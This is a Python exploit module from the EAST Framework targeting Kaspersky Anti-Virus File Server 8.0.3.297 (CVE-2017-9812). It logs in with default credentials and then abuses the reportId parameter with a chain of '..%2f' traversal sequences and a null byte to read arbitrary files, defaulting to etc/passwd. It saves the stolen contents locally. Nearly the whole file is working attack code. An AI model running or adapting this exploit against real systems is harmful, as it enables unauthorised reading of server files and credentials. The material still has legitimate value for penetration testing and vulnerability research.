#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import urllib2
import json
from collections import OrderedDict

sys.path.append('./core')
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_kaspersky_anti_virus_file_server_fd.py"
INFO['DESCRIPTION'] = "Kaspersky Anti-Virus File Server 8.0.3.297 - Directory Traversal"
INFO['VENDOR'] = "http://www.kaspersky.ru"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ['https://www.exploit-db.com/exploits/42269/']
INFO["CVE Name"] = "CVE-2017-9812"
INFO["NOTES"] = """The reportId parameter of the getReportStatus action method can be abused to read arbitrary files with kluser privileges.
"""

INFO['CHANGELOG'] = "29 Aug, 2017. Written by Gleg team."
INFO['PATH'] = 'Exploits/General/'

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "127.0.0.1", dict(description = 'Target IP')
OPTIONS["PORT"] = 9080, dict(description = 'Target port')
OPTIONS["USERNAME"] = 'admin', dict(description = 'Username')
OPTIONS["PASSWORD"] = 'password', dict(description = 'Password')
OPTIONS['PATH'] = 'etc/passwd', dict(description = 'Path to downloaded file at target machine')

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.host = host
        self.port = port
        self.username = ''
        self.password = ''
        self.path = OPTIONS['PATH']
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get('HOST', self.host)
        self.port = int(self.args.get('PORT', self.port))
        self.path = self.args.get('PATH', OPTIONS['PATH'])
        self.username = self.args.get('USERNAME', OPTIONS['USERNAME'])
        self.password = self.args.get('PASSWORD', OPTIONS['PASSWORD'])
    
    def make_url(self, path = ''):
        return 'http://{}:{}/{}'.format(self.host, self.port, path)
    
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        trav = '..%2f' * 10
        self.path = '/cgi-bin/cgictl?action=getReportStatus&reportId=' + trav + self.path + '%00'
        
        self.log('Trying to log in with {}:{}'.format(self.username, self.password))
        
        url = '/cgi-bin/cgictl?action=userLogin'
        data = 'username={}&password={}'.format(self.username, self.password)
        
        try:
            fd = urllib2.urlopen(self.make_url(url), data)
            cookies = fd.read()[1:-2]
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        sid = cookies.replace('"','').replace(':', '=')
        request = urllib2.Request(self.make_url(self.path))
        request.add_header('Cookie', 'iconsole_test; wmc_useWZRDods=true; wmc_iconsole_lang=resource_ru.js; wmc_' + sid)
        
        try:
            fd = urllib2.urlopen(request)
            result = json.loads(fd.read().replace('\x00', ''))
        except Exception as e:
            self.log(e)
            self.finish(False)
            
        self.log('= File Content =')
        self.log(result['reportName'])
        self.log('= End of File  =')
        self.writefile(result['reportName'])
        self.finish(True)
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
